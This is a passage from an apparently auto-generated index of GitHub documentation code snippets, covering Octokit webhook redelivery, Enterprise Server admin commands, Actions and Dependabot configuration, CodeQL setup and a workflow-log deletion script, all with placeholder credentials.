/repos/{owner}/{repo}/issues/{issue_number}/comments\", {\n      owner: owner,\n      repo: repo,\n      issue_number: pullNumber,\n      body: `It looks like you changed a data file. These files are auto-generated. \\n\\nYou must revert any changes to data files before your pull request will be reviewed.`,\n      headers: {\n        \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    });\n\n    return comment.html_url;\n  } catch (error) {\n    if (error.response) {\n      console.error(`Error! Status: ${error.response.status}. Message: ${error.response.data.message}`)\n    }\n    console.error(error)\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Redeliver Failed Deliveries Script - JavaScript\nDESCRIPTION: This JavaScript script uses Octokit SDK to find and redeliver failed webhook deliveries. It fetches environment variables, retrieves deliveries since the last execution time, filters duplicate failed deliveries, redelivers them, and updates a variable with the current execution time. It depends on Octokit and environment variables for authentication and configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/automatically-redelivering-failed-deliveries-for-a-github-app-webhook.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// This script uses {% data variables.product.company_short %}'s Octokit SDK to make API requests. For more information, see [AUTOTITLE](/rest/guides/scripting-with-the-rest-api-and-javascript).\nimport { App, Octokit } from \"octokit\";\n\n//\nasync function checkAndRedeliverWebhooks() {\n  // Get the values of environment variables that were set by the {% data variables.product.prodname_actions %} workflow.\n  const APP_ID = process.env.APP_ID;\n  const PRIVATE_KEY = process.env.PRIVATE_KEY;\n  const TOKEN = process.env.TOKEN;\n  const LAST_REDELIVERY_VARIABLE_NAME = process.env.LAST_REDELIVERY_VARIABLE_NAME;\n  {% ifversion ghes %}const HOSTNAME = process.env.HOSTNAME;{% endif %}\n  const WORKFLOW_REPO_NAME = process.env.WORKFLOW_REPO;\n  const WORKFLOW_REPO_OWNER = process.env.WORKFLOW_REPO_OWNER;\n\n  // Create an instance of the octokit `App` using the {% ifversion ghes %}app ID, private key, and hostname{% else %}app ID and private key{% endif %} values that were set in the {% data variables.product.prodname_actions %} workflow.\n  //\n  // This will be used to make API requests to the webhook-related endpoints.\n  const app = new App({\n    appId: APP_ID,\n    privateKey: PRIVATE_KEY,{% ifversion ghes %}\n    Octokit: Octokit.defaults({\n      baseUrl: \"{% data variables.product.rest_url %}\",\n    }),{% endif %}\n  });\n\n  // Create an instance of `Octokit` using the token{% ifversion ghes %} and hostname{% endif %} values that were set in the {% data variables.product.prodname_actions %} workflow.\n  //\n  // This will be used to update the configuration variable that stores the last time that this script ran.\n  const octokit = new Octokit({ {% ifversion ghes %}\n    baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n    auth: TOKEN,\n  });\n\n  try {\n    // Get the last time that this script ran from the configuration variable. If the variable is not defined, use the current time minus 24 hours.\n    const lastStoredRedeliveryTime = await getVariable({\n      variableName: LAST_REDELIVERY_VARIABLE_NAME,\n      repoOwner: WORKFLOW_REPO_OWNER,\n      repoName: WORKFLOW_REPO_NAME,\n      octokit,\n    });\n    const lastWebhookRedeliveryTime = lastStoredRedeliveryTime || (Date.now() - (24 * 60 * 60 * 1000)).toString();\n\n    // Record the time that this script started redelivering webhooks.\n    const newWebhookRedeliveryTime = Date.now().toString();\n\n    // Get the webhook deliveries that were delivered after `lastWebhookRedeliveryTime`.\n    const deliveries = await fetchWebhookDeliveriesSince({lastWebhookRedeliveryTime, app});\n\n    // Consolidate deliveries that have the same globally unique identifier (GUID). The GUID is constant across redeliveries of the same delivery.\n    let deliveriesByGuid = {};\n    for (const delivery of deliveries) {\n      deliveriesByGuid[delivery.guid]\n        ? deliveriesByGuid[delivery.guid].push(delivery)\n        : (deliveriesByGuid[delivery.guid] = [delivery]);\n    }\n\n    // For each GUID value, if no deliveries for that GUID have been successfully delivered within the time frame, get the delivery ID of one of the deliveries with that GUID.\n    //\n    // This will prevent duplicate redeliveries if a delivery has failed multiple times.\n    // This will also prevent redelivery of failed deliveries that have already been successfully redelivered.\n    let failedDeliveryIDs = [];\n    for (const guid in deliveriesByGuid) {\n      const deliveries = deliveriesByGuid[guid];\n      const anySucceeded = deliveries.some(\n        (delivery) => delivery.status === \"OK\"\n      );\n      if (!anySucceeded) {\n        failedDeliveryIDs.push(deliveries[0].id);\n      }\n    }\n\n    // Redeliver any failed deliveries.\n    for (const deliveryId of failedDeliveryIDs) {\n      await redeliverWebhook({deliveryId, app});\n    }\n\n    // Update the configuration variable (or create the variable if it doesn't already exist) to store the time that this script started.\n    // This value will be used next time this script runs.\n    await updateVariable({\n      variableName: LAST_REDELIVERY_VARIABLE_NAME,\n      value: newWebhookRedeliveryTime,\n      variableExists: Boolean(lastStoredRedeliveryTime),\n      repoOwner: WORKFLOW_REPO_OWNER,\n      repoName: WORKFLOW_REPO_NAME,\n      octokit,\n      });\n\n\n    // Log the number of redeliveries.\n    console.log(\n      `Redelivered ${\n        failedDeliveryIDs.length\n      } failed webhook deliveries out of ${\n        deliveries.length\n      } total deliveries since ${Date(lastWebhookRedeliveryTime)}.`\n    );\n  } catch (error) {\n    // If there was an error, log the error so that it appears in the workflow run log, then throw the error so that the workflow run registers as a failure.\n    if (error.response) {\n      console.error(\n        `Failed to check and redeliver webhooks: ${error.response.data.message}`\n      );\n    }\n    console.error(error);\n    throw(error);\n  }\n}\n\n// This function will fetch all of the webhook deliveries that were delivered since `lastWebhookRedeliveryTime`.\n// It uses the `octokit.paginate.iterator()` method to iterate through paginated results. For more information, see [AUTOTITLE](/rest/guides/scripting-with-the-rest-api-and-javascript#making-paginated-requests).\n//\n// If a page of results includes deliveries that occurred before `lastWebhookRedeliveryTime`,\n// it will store only the deliveries that occurred after `lastWebhookRedeliveryTime` and then stop.\n// Otherwise, it will store all of the deliveries from the page and request the next page.\nasync function fetchWebhookDeliveriesSince({lastWebhookRedeliveryTime, app}) {\n  const iterator = app.octokit.paginate.iterator(\n    \"GET /app/hook/deliveries\",\n    {\n      per_page: 100,\n      headers: {\n        \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    }\n  );\n\n  const deliveries = [];\n\n  for await (const { data } of iterator) {\n    const oldestDeliveryTimestamp = new Date(\n      data[data.length - 1].delivered_at\n    ).getTime();\n\n    if (oldestDeliveryTimestamp < lastWebhookRedeliveryTime) {\n      for (const delivery of data) {\n        if (\n          new Date(delivery.delivered_at).getTime() > lastWebhookRedeliveryTime\n        ) {\n          deliveries.push(delivery);\n        } else {\n          break;\n        }\n      }\n      break;\n    } else {\n      deliveries.push(...data);\n    }\n  }\n\n  return deliveries;\n}\n\n// This function will redeliver a failed webhook delivery.\nasync function redeliverWebhook({deliveryId, app}) {\n  await app.octokit.request(\"POST /app/hook/deliveries/{delivery_id}/attempts\", {\n    delivery_id: deliveryId,\n  });\n}\n\n// This function gets the value of a configuration variable.\n// If the variable does not exist, the endpoint returns a 404 response and this function returns `undefined`.\nasync function getVariable({ variableName, repoOwner, repoName, octokit }) {\n  try {\n    const {\n      data: { value },\n    } = await octokit.request(\n      \"GET /repos/{owner}/{repo}/actions/variables/{name}\",\n      {\n        owner: repoOwner,\n        repo: repoName,\n        name: variableName,\n      }\n    );\n    return value;\n  } catch (error) {\n    if (error.status === 404) {\n      return undefined;\n    } else {\n      throw error;\n    }\n  }\n}\n\n// This function will update a configuration variable (or create the variable if it doesn't already exist). For more information, see [AUTOTITLE](/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows).\nasync function updateVariable({\n  variableName,\n  value,\n  variableExists,\n  repoOwner,\n  repoName,\n  octokit,\n}) {\n  if (variableExists) {\n    await octokit.request(\n      \"PATCH /repos/{owner}/{repo}/actions/variables/{name}\",\n      {\n        owner: repoOwner,\n        repo: repoName,\n        name: variableName,\n        value: value,\n      }\n    );\n  } else {\n    await octokit.request(\"POST /repos/{owner}/{repo}/actions/variables\", {\n      owner: repoOwner,\n      repo: repoName,\n      name: variableName,\n      value: value,\n    });\n  }\n}\n\n// This will execute the `checkAndRedeliverWebhooks` function.\n(async () => {\n  await checkAndRedeliverWebhooks();\n})();\n\n```\n\n----------------------------------------\n\nTITLE: Specifying Operating System for GitHub Actions Runner (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to specify the operating system for a GitHub Actions runner using the `runs-on` keyword. It defines the runner environment where the job will execute. The specified operating system will be used as the base image for the runner environment.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/choosing-runner-github-hosted.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nruns-on: ubuntu-latest\n```\n\n----------------------------------------\n\nTITLE: Enabling Secret Scanning via SSH Shell\nDESCRIPTION: This command enables Secret Scanning on GitHub Enterprise Server via the administrative shell (SSH). It requires SSH access to the instance. It uses `ghe-config` to set the `app.secret-scanning.enabled` configuration option to `true`. No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.secret-scanning.enabled true\n```\n\n----------------------------------------\n\nTITLE: Migrate Travis CI to GitHub Actions\nDESCRIPTION: This command migrates a Travis CI pipeline to GitHub Actions.  It requires the target repository URL and the Travis CI repository name.  The output includes the URL to the pull request that adds the converted workflow to the target repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository\n```\n\n----------------------------------------\n\nTITLE: Configuring Node.js Certificate for Self-Hosted Runners (Shell)\nDESCRIPTION: This snippet demonstrates how to configure Node.js to use a self-signed certificate for self-hosted runners. It sets the `NODE_EXTRA_CA_CERTS` environment variable, which is required for Node.js to trust the certificate when running JavaScript-based actions. The path should point to the location of the certificate file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/advanced-configuration-and-troubleshooting/troubleshooting-github-actions-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nNODE_EXTRA_CA_CERTS=/usr/share/ca-certificates/extra/mycertfile.crt\n```\n\n----------------------------------------\n\nTITLE: Cluster Failover (ghe-cluster-failover)\nDESCRIPTION: With the `ghe-cluster-failover` utility, you can fail over to your replica cluster.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_39\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-failover\n```\n\n----------------------------------------\n\nTITLE: Azure Pipelines Task Syntax (YAML)\nDESCRIPTION: This YAML snippet shows the syntax for defining a task in Azure Pipelines. It specifies the Python version and architecture using the `UsePythonVersion@0` task. This example demonstrates setting up a specific Python environment using Azure Pipelines tasks.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_8\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  - job: run_python\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - task: UsePythonVersion@0\n        inputs:\n          versionSpec: '3.7'\n          architecture: 'x64'\n      - script: python script.py\n```\n\n----------------------------------------\n\nTITLE: Repackage Git Repository (ghe-repo-gc)\nDESCRIPTION: This command manually repackages a repository network to optimize pack storage. If the repository is large, running this command might help reduce its overall size. Requires the USERNAME/REPONAME as input.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_63\n\nLANGUAGE: shell\nCODE:\n```\nghe-repo-gc USERNAME/REPONAME\n```\n\n----------------------------------------\n\nTITLE: Checking Repository Replication Status with `ghe-spokesctl`\nDESCRIPTION: These snippets show how to check the replication status of a specific repository or repository network using the `ghe-spokesctl` command-line utility. Replace `OWNER` and `REPOSITORY` with the appropriate values for a repository, or `NETWORK-ID` and `REPOSITORY-ID` for a repository network.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/monitoring-a-high-availability-configuration.md#_snippet_3\n\nLANGUAGE: Text\nCODE:\n```\nghe-spokesctl check OWNER/REPOSITORY\nghe-spokesctl info OWNER/REPOSITORY\n```\n\nLANGUAGE: Text\nCODE:\n```\nghe-spokesctl check NETWORK-ID/REPOSITORY-ID\nghe-spokesctl info NETWORK-ID/REPOSITORY-ID\n```\n\n----------------------------------------\n\nTITLE: Adding Repositories from File with ghe-migrator\nDESCRIPTION: This code snippet shows how to add multiple repositories to a migration by reading repository URLs from a text file.  The `-i` flag is used to specify the path to the file containing the repository URLs. The text file should contain one URL per line.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator add -i PATH/TO/YOUR/REPOSITORY_URL.txt\n```\n\n----------------------------------------\n\nTITLE: Aborting a Migration using GitHub CLI\nDESCRIPTION: This command aborts an ongoing migration using the GitHub CLI's `gei` extension. It requires the migration ID to identify the migration to be aborted.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-githubcom-to-github-enterprise-cloud.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh gei abort-migration --migration-id MIGRATION-ID\n```\n\n----------------------------------------\n\nTITLE: Tearing Down GHES Replication on a Replica Node\nDESCRIPTION: This command completely disables replication on a GHES replica node, removing the replica configuration.  It can be run from the replica node or, if unreachable, from the primary node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_78\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-teardown\n```\n\n----------------------------------------\n\nTITLE: Disabling Secret Scanning via SSH Shell\nDESCRIPTION: This command disables Secret Scanning on GitHub Enterprise Server via the administrative shell (SSH). It requires SSH access to the instance. It uses `ghe-config` to set the `app.secret-scanning.enabled` configuration option to `false`. No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.secret-scanning.enabled false\n```\n\n----------------------------------------\n\nTITLE: Running the REST API decoration script with npm\nDESCRIPTION: This command executes the `sync-rest` script with the `--decorate-only` flag, focusing solely on decorating existing dereferenced OpenAPI files. This is primarily used in production by an automated bot (`github-openapi-bot`) during CI/CD processes. It ensures that the decorated files are up-to-date without re-fetching the base schema, optimizing the update process.\nSOURCE: https://github.com/github/docs/blob/main/src/rest/scripts/README.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm run sync-rest -- --decorate-only\n```\n\n----------------------------------------\n\nTITLE: Deleting workflow run logs programmatically with a bash script\nDESCRIPTION: This bash script deletes all logs for a given workflow in a GitHub repository. It requires the repository name and workflow file name as input, uses the GitHub CLI (`gh`) to fetch completed workflow runs and delete associated logs. It includes error handling and rate limiting considerations.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs.md#_snippet_0\n\nLANGUAGE: Bash\nCODE:\n```\n#!/usr/bin/env bash\n\n# Delete all logs for a given workflow\n# Usage: delete-logs.sh <repository> <workflow-name>\n\nset -oe pipefail\n\nREPOSITORY=$1\nWORKFLOW_NAME=$2\n\n# Validate arguments\nif [[ -z \"$REPOSITORY\" ]]; then\n  echo \"Repository is required\"\n  exit 1\nfi\n\nif [[ -z \"$WORKFLOW_NAME\" ]]; then\n  echo \"Workflow name is required\"\n  exit 1\nfi\n\necho \"Getting all completed runs for workflow $WORKFLOW_NAME in $REPOSITORY\"\n\nRUNS=$(\n  gh api \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/workflows/$WORKFLOW_NAME/runs\" \\\n    --paginate \\\n    --jq '.workflow_runs[] | select(.conclusion != \"\") | .id'\n)\n\necho \"Found $(echo \"$RUNS\" | wc -l) completed runs for workflow $WORKFLOW_NAME\"\n\n# Delete logs for each run\nfor RUN in $RUNS; do\n  echo \"Deleting logs for run $RUN\"\n  gh api \\\n    --silent \\\n    --method DELETE \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/runs/$RUN/logs\" || echo \"Failed to delete logs for run $RUN\"\n\n  # Sleep for 100ms to avoid rate limiting\n  sleep 0.1\ndone\n```\n\n----------------------------------------\n\nTITLE: Configuring settings.xml for GitHub Packages authentication (Subdomain Isolation Disabled)\nDESCRIPTION: This XML snippet configures the `settings.xml` file for Apache Maven to authenticate with GitHub Packages when subdomain isolation is disabled.  It defines active profiles, repositories, and server credentials, including the GitHub username and personal access token (PAT). Replace USERNAME with your GitHub username, TOKEN with your PAT, HOSTNAME with your GitHub Enterprise Server hostname, OWNER with the repository owner, and REPOSITORY with the repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry.md#_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.0.0\n                      http://maven.apache.org/xsd/settings-1.0.0.xsd\">\n\n  <activeProfiles>\n    <activeProfile>github</activeProfile>\n  </activeProfiles>\n\n  <profiles>\n    <profile>\n      <id>github</id>\n      <repositories>\n        <repository>\n          <id>central</id>\n          <url>https://repo1.maven.org/maven2</url>\n        </repository>\n        <repository>\n          <id>github</id>\n          <url>HOSTNAME/_registry/maven/OWNER/REPOSITORY</url>\n          <snapshots>\n            <enabled>true</enabled>\n          </snapshots>\n        </repository>\n      </repositories>\n    </profile>\n  </profiles>\n\n  <servers>\n    <server>\n      <id>github</id>\n      <username>USERNAME</username>\n      <password>TOKEN</password>\n    </server>\n  </servers>\n</settings>\n```\n\n----------------------------------------\n\nTITLE: Verifying Default Dev Container Image (Shell)\nDESCRIPTION: This shell output shows the information displayed when the 'devcontainer-info' command is executed within a codespace that uses the default dev container image. It verifies that the codespace uses the default image.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-included-usage.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n- Definition ID: universal\n- Source code repository: https://github.com/devcontainers/images\n```\n\n----------------------------------------\n\nTITLE: Attempting SSH Connection with Incorrect Username\nDESCRIPTION: This snippet demonstrates an unsuccessful SSH connection attempt using a GitHub username instead of the 'git' user.  It highlights the importance of always using the 'git' user for SSH connections to GitHub to prevent authentication failures.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ ssh -T GITHUB-USERNAME@{% data variables.product.product_url %}\n```\n\n----------------------------------------\n\nTITLE: Defining Test Directory in qlpack.yml (YAML)\nDESCRIPTION: This snippet shows how to define the directory containing tests within a CodeQL pack.  The `tests` property specifies the path relative to the pack directory. Using `.` indicates that the entire pack directory contains tests. This setting is used when running tests with the `--strict-test-discovery` option.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_14\n\nLANGUAGE: YAML\nCODE:\n```\ntests: .\n```\n\n----------------------------------------\n\nTITLE: Cloning GitHub Copilot Plugin for Neovim (macOS/Linux)\nDESCRIPTION: This shell command clones the GitHub Copilot plugin repository into the appropriate directory for Neovim on macOS or Linux using the built-in plugin manager. The command utilizes `git clone` to download the repository from GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/installing-the-github-copilot-extension-in-your-environment.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://github.com/github/copilot.vim \\\n~/.config/nvim/pack/github/start/copilot.vim\n```\n\n----------------------------------------\n\nTITLE: SSH Authentication Failure on Linux (Public Key)\nDESCRIPTION: This snippet illustrates an error message observed on certain Linux distributions during SSH authentication. It indicates a failure to sign using the key and a subsequent 'Permission denied (publickey)' error. This is a known issue related to SSH agent interaction.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n...\nAgent admitted failure to sign using the key.\ndebug1: No more authentication methods to try.\nPermission denied (publickey).\n```\n\n----------------------------------------\n\nTITLE: Creating authenticated Octokit instance for installation\nDESCRIPTION: This code snippet shows how to create an authenticated `octokit` instance for a specific installation ID using the `getInstallationOctokit` method of the `App` instance. Replace `INSTALLATION_ID` with the actual installation ID. This instance can then be used to make API requests on behalf of the installation.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst octokit = await app.getInstallationOctokit(INSTALLATION_ID);\n```\n\n----------------------------------------\n\nTITLE: Creating a Codespace with Flags using GitHub CLI\nDESCRIPTION: This command creates a new codespace using the GitHub CLI, specifying options using flags. It requires specifying the repository, and can optionally specify the branch, dev container path, and machine type.  The path to the dev container file needs to be correctly specified, and the machine type should be a valid identifier for an available machine.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/creating-a-codespace-for-a-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace create -r OWNER/REPO -b BRANCH --devcontainer-path PATH -m MACHINE-TYPE\n```\n\n----------------------------------------\n\nTITLE: Configuring Python index with ProGet for Dependabot\nDESCRIPTION: This YAML snippet configures Dependabot to use a ProGet Python (PyPI) index. It defines the registry type as `python-index`, provides the URL of the index, and specifies the token for authentication. The token is expected to be stored as a secret in the environment.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  proget-python-feed:\n    type: python-index\n    url: https://proget.corp.local/pypi/MyPythonFeed\n    token: ${{secrets.PROGET_APK_KEY}}\n```\n\n----------------------------------------\n\nTITLE: Configuring npm registry URL in .npmrc file\nDESCRIPTION: This snippet shows how to set the npm registry URL within the `.npmrc` configuration file.  This file should be checked into the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_9\n\nLANGUAGE: text\nCODE:\n```\nregistry=https://<private-registry-url>\n```\n\n----------------------------------------\n\nTITLE: Defining a CodeQL Test Pack\nDESCRIPTION: This YAML snippet demonstrates how to define a CodeQL test pack using a `qlpack.yml` file. The file specifies the name of the test pack, its version, dependencies on CodeQL libraries and queries to be tested, and the language of the code being tested.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: <name-of-test-pack>\nversion: 0.0.0\ndependencies:\n  <codeql-libraries-and-queries-to-test>: \"*\"\nextractor: <language-of-code-to-test>\n```\n\n----------------------------------------\n\nTITLE: Confirm global Git username\nDESCRIPTION: This snippet retrieves the globally configured Git username using the `git config --global user.name` command to verify if the username has been set correctly. The expected output is the username that was previously set.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/setting-your-username-in-git.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git config --global user.name\n> Mona Lisa\n```\n\n----------------------------------------\n\nTITLE: Displaying Help for the Debug CLI\nDESCRIPTION: This snippet shows how to display the help documentation for the `gh debug-cli` tool. It uses the `gh debug-cli` command with the `-h` flag, which triggers the display of available flags and descriptions for the tool.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/debugging-your-github-copilot-extension.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngh debug-cli -h\n```\n\n----------------------------------------\n\nTITLE: Finding All Organization Projects Node IDs (curl)\nDESCRIPTION: This snippet demonstrates how to find the node ID and title of all projects in an organization using a curl command with a GraphQL query. Replace `ORGANIZATION` with the organization name. It returns the first 20 projects. Requires a `TOKEN` with `read:project` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"{organization(login: \\\"ORGANIZATION\\\") {projectsV2(first: 20) {nodes {id title}}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Coding Guideline Example: Tag Metrics with Environment\nDESCRIPTION: This example sets a coding guideline that mandates tagging metrics with the current environment (e.g., `env:prod` or `env:dev`). This guideline targets Go and Java files, ensuring proper environment context for metrics.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/code-review/configuring-coding-guidelines.md#_snippet_4\n\n\n\n----------------------------------------\n\nTITLE: Enabling Policy in Kubernetes Namespace with kubectl label\nDESCRIPTION: This command enables the artifact attestation policy in a specific Kubernetes namespace by adding a label to the namespace. Replace `MY-NAMESPACE` with the name of the namespace where the policy should be enforced. This command uses `kubectl label` to modify the namespace metadata.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nkubectl label namespace MY-NAMESPACE policy.sigstore.dev/include=true\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Swift Project with Xcodebuild\nDESCRIPTION: This snippet demonstrates creating a CodeQL database for a Swift project using `xcodebuild`.  It executes `xcodebuild build -target your-target`. The 'your-target' part of the command needs to be changed based on the target in the Xcode project. It assumes Xcode and CodeQL CLI are installed and configured properly.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_17\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create -l swift -c \"xcodebuild build -target your-target\" swift-database\n```\n\n----------------------------------------\n\nTITLE: Fetching Repository Languages API\nDESCRIPTION: This Ruby snippet iterates through each repository and fetches the languages used in each repo using the `octokit_client.languages` method which calls the {% data variables.product.github %} API `/repos/{owner}/{repo}/languages` endpoint. It retrieves the language data for each repository.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nrepos.each do |repo|\n  repo_name = repo.name\n  repo_langs = octokit_client.languages(\"#{github_user.login}/#{repo_name}\")\nend\n```\n\n----------------------------------------\n\nTITLE: Importing from Subversion with git-import-svn-raw (Shell)\nDESCRIPTION: This command makes a raw clone of a Subversion project, creating a new Git repository with refs in 'refs/import/'. It requires the URL of the source Subversion project and a path for the temporary repository. Replace `SVN-CLONE-URL` and `/PATH/REPO-NAME.git` with the actual Subversion clone URL and desired repository path.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ git-import-svn-raw SVN-CLONE-URL /PATH/REPO-NAME.git\n# Creates a new repository with one or more Git refs in \"refs/import/\" in the specified path.\n```\n\n----------------------------------------\n\nTITLE: Running Content Linter with Specific Rules - Shell\nDESCRIPTION: This command runs the content linter script, targeting specific files and rules. The `--paths` argument specifies the file to be linted relative to the docs-internal root, and `--rules` argument indicates the name of the rule to execute. This is used for testing new or modified rules against actual content.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/README.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- --paths <path to file relative to docs-internal root> --rules <name of your new rule>\n```\n\n----------------------------------------\n\nTITLE: Debugging incorrect output with Copilot\nDESCRIPTION: This prompt is intended for use with GitHub Copilot Chat to debug incorrect output in Python code. It asks Copilot to explain why the code produces a higher-than-expected output and to suggest a solution to fix it.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/learning-to-debug-with-github-copilot.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nWhy is the output of this code so much higher than expected? Please explain in depth and suggest a solution.\n```\n\n----------------------------------------\n\nTITLE: Defining Topics in YAML Frontmatter\nDESCRIPTION: This YAML snippet demonstrates how to define topics in an article's frontmatter. The `topics` key contains a list of strings, each representing a topic relevant to the article's content. These topics are used to categorize and make the article searchable.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/about-topics.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n---\ntitle: \"Managing branches in your repository\"\ntopics:\n  - \"GitHub\"\n  - \"Git\"\n  - \"Repositories\"\n---\n```\n\n----------------------------------------\n\nTITLE: Creating a New Project using GraphQL with curl\nDESCRIPTION: This snippet demonstrates how to create a new project using the GitHub GraphQL API and `curl`. It requires replacing `OWNER_ID` with the node 